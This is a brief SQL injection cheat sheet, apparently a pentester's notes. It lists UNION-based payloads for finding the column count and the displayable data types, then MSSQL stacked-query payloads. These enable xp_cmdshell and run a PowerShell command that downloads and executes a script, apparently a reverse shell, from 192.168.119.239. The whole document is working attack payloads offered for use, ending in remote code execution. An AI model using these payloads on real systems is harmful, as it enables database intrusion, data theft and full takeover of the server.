```
Determining Columns: 
'UNION SELECT NULL--
'UNION SELECT NULL, NULL--
'UNION SELECT NULL, NULL, NULL--
'UNION SELECT NULL, NULL, NULL, NULL--

'union order by 1--
'union order by 2--
'union order by 3--
'union order by 4--

'UNION ALL SELECT 1;--
'UNION ALL SELECT 1,2;--
'UNION ALL SELECT 1,2,3;--
'UNION ALL SELECT 1,2,3,4;--

Figuring out data type and what can be displayed back to us:
'UNION SELECT 'a', NULL, NULL--
'UNION SELECT NULL, 'a', NULL--
'UNION SELECT NULL, NULL, 'a'--

Abusing stacked queries for code execution: 
o'union select is_srvrolemember('sysadmin'),2; EXEC sp_configure 'show advanced options', 1;--
o'union select is_srvrolemember('sysadmin'),2; EXEC sp_configure 'xp_cmdshell', 1;--
'union select name,2 from master..sysdatabases; RECONFIGURE;--
'RECONFIGURE;--

'union select name,2 from master..sysdatabases; EXEC xp_cmdshell 'powershell -c iex (iwr -usebasicparsing <http://192.168.119.239/rev3.ps1)';-->
```

